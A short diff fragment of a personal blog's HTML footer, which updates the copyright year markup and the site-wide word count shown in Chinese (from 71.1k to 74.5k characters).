+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -930,7 +1025,7 @@
 
 <div class="theme-info">
  <div class="powered-by"></div>
- <span class="post-count">博客全站共71.1k字</span>
+ <span class="post-count">博客全站共74.5k字</span>
 </div>
         
 
